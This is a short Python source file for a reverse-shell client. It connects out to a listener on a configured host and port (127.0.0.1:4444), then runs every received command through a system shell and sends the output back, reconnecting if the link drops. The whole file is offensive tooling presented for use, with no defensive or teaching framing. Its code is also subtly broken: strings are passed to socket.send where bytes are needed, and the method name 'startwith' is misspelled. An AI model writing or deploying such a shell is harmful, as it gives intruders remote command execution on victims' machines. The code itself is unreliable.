import os
import socket
from time import sleep 
import subprocess
from colorama import init, Fore 

host = "127.0.0.1"
port = 4444
init(autoreset=True)
class ShellTcp:
  def __init__(self, host, port):
    self.host = host
    self.port = port
    self.socket = None
    self.data = None
  def servidor(self):
    try:
      self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      self.socket.connect((self.host, self.port))
      host_name, port_name = self.socket.getsockname()
      self.socket.send(f"{Fore.RED}[+] {Fore.YELLOW}HOST > {Fore.RESET}{host_name}\n")
      self.socket.send(f"{Fore.RED}[+] {Fore.YELLOW}Reverse Shell {Fore.RESET} Instaled\n")
    except Exception as e:
      self.socket.send(f"[-] erro {e}")
  def listen(self):
    while True:
      try:
        self.data = self.socket.recv(1024).decode().strip()
        if self.data == "/exit":
          return
        else:
          self.cmd(self.socket, self.data)
      except Exception as e:
        self.socket.send(f"[-] error {e}")
  def cmd(self, server, data):
    try:
      if data.startwith("cd "):
        os.chdir(data [3:].strip())
        return
      p = subprocess.Popen(
        data,
        shell=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
      )
      server.send(
        p.stdout.read() + p.stderr.read() + b"\n"
      )
    except Exception as e:
      self.socket.send(f"[-] error {e}")
      return

if __name__ == "__main__":
  user = ShellTcp(host, port)
  while True:
    try:
      user.servidor()
      user.listen()
    except Exception as e:
      print(f"error {e}")
      sleep(0.5)
